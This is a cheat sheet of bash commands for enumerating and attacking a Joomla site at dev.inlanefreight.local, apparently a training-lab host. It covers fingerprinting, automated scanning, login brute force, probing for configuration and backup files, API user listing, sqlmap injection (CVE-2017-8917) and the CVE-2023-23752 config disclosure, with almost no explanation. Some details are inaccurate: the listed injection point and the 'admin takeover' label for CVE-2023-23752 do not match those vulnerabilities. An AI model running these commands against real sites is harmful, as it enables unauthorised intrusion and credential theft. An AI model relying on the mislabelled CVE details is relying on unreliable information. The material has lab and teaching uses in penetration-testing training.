# Joomla Discovery and Enumeration

## 1. Basic Identification

```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla
curl -s http://dev.inlanefreight.local/robots.txt
curl -s http://dev.inlanefreight.local/README.txt
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml
curl -s http://dev.inlanefreight.local/plugins/system/cache/cache.xml
curl -I http://dev.inlanefreight.local/favicon.ico
```

## 2. Version Enumeration

```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
curl -I http://dev.inlanefreight.local/ | grep "X-Content-Encoded-By"
curl -s http://dev.inlanefreight.local/CHANGELOG.php
```

## 3. Automated Scanning

```bash
droopescan scan joomla --url http://dev.inlanefreight.local/
python2.7 joomlascan.py -u http://dev.inlanefreight.local/
```

## 4. Login Brute Force

```bash
python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## 5. Extension Enumeration

```bash
curl -s http://dev.inlanefreight.local/components/
curl -s http://dev.inlanefreight.local/modules/
curl -s http://dev.inlanefreight.local/plugins/
curl -s http://dev.inlanefreight.local/templates/
curl -s http://dev.inlanefreight.local/media/
curl -s http://dev.inlanefreight.local/components/com_content/assets/js/content.js
```

## 6. Configuration and Backup Files

```bash
curl -s http://dev.inlanefreight.local/configuration.php
curl -s http://dev.inlanefreight.local/configuration.php.bak
curl -s http://dev.inlanefreight.local/backup.zip
curl -s http://dev.inlanefreight.local/joomla.sql
```

## 7. Directory Enumeration

```bash
dirb http://dev.inlanefreight.local /usr/share/wordlists/dirb/common.txt
```

## 8. REST API Enumeration

```bash
curl -s http://dev.inlanefreight.local/api/index.php/v1/users
```

## 9. Joomla CLI

```bash
joomla user:list
```

## 10. Exploiting Known Vulnerabilities

**SQL Injection (CVE-2017-8917):**

```bash
sqlmap -u "http://dev.inlanefreight.local/index.php?option=com_content&id=1" --dbs --batch
```

**Unauthenticated Admin Takeover (CVE-2023-23752):**

```bash
curl -X GET "http://dev.inlanefreight.local/api/index.php/v1/config/application?public=true"
```

## 11. User Enumeration

```bash
curl -X POST -d "username=admin" http://dev.inlanefreight.local/index.php?option=com_users&view=reset
```

## 12. Debug and Log Files

```bash
curl -s http://dev.inlanefreight.local/logs/error.php
curl -s http://dev.inlanefreight.local/logs/debug.log
```

## 13. Extracting Sensitive Data

```bash
grep -i "password" logs/error.php
```

## 14. Default Credentials Check

```bash
joomla user:list --filter super --output=json | jq '.[].username'
```
